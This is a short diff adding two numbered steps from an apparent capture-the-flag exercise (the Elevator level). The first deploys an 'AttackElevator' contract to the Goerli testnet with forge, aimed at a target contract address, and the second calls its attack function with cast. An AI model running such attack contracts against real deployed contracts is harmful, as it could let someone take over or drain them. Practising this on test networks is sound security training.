@@ -1,0 +1,15 @@
+4. forge create src/11Elevator/Solution.sol:AttackElevator \
+ --rpc-url https://goerli.infura.io/v3/{key} \
+ --private-key {key} \
+ --constructor-args "0xD9EAaf9cEf8a8E21508e213803dEb66e5FB629A3" \
+ --etherscan-api-key {key} \
+ --verify 
+
+
+5. cast send 0xb4b5af42B34c3868D00cf0454b251B876d818574 "attack(uint floor)" 10 \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} \
+--gas-limit 500000 \
+--gas-price 1gwei
+
+
